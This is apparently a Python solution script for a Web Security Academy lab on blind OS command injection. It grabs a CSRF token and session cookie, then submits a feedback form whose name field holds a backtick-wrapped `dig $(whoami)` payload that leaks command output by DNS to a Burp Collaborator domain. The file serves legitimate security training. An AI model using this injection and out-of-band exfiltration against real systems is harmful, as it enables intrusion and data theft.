###############################################################################
#
# Lab: Blind OS command injection with out-of-band data exfiltration
#
# Hack Steps: 
#      1. Fetch the feedback page
#      2. Extract the csrf token and session cookie
#      3. Inject payload into the name field when submitting a feedback
#         to execute the `whoami` command and exfiltrate the output via
#         a DNS query to burp collaborator.
#      4. Check your burp collaborator for the output of the `whoami` command
#
###############################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0a9200ce049be5f583d99b5e006a0008.web-security-academy.net"

# Change this to your collaborator domain
BURP_COLLABORATOR = "oh9w8t29cvljyklxl190p6yt2k8bw1kq.oastify.com"

def main():
    print("⦗#⦘ Injection point: " + Fore.YELLOW + "name")
    print(Fore.WHITE + "⦗1⦘ Fetching the feedback page.. ", end="", flush=True)

    feedback_page = fetch("/feedback")   

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)

    session = feedback_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", feedback_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Injecting payload to execute the `whoami` command.. " , end="", flush=True)
   
    payload = f"`dig $(whoami).{BURP_COLLABORATOR}`"
    cookies ={ "session": session }
    data = { "csrf": csrf_token, "name": payload, "email": "no@hack.com", "subject": "hacking", "message": "you are hacked" }
    post_data("/feedback/submit", data, cookies)
   
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check your burp collaborator for the output of the `whoami` command then submit the answer")


def fetch(path):
    try:  
        return requests.get(f"{LAB_URL}{path}", allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()



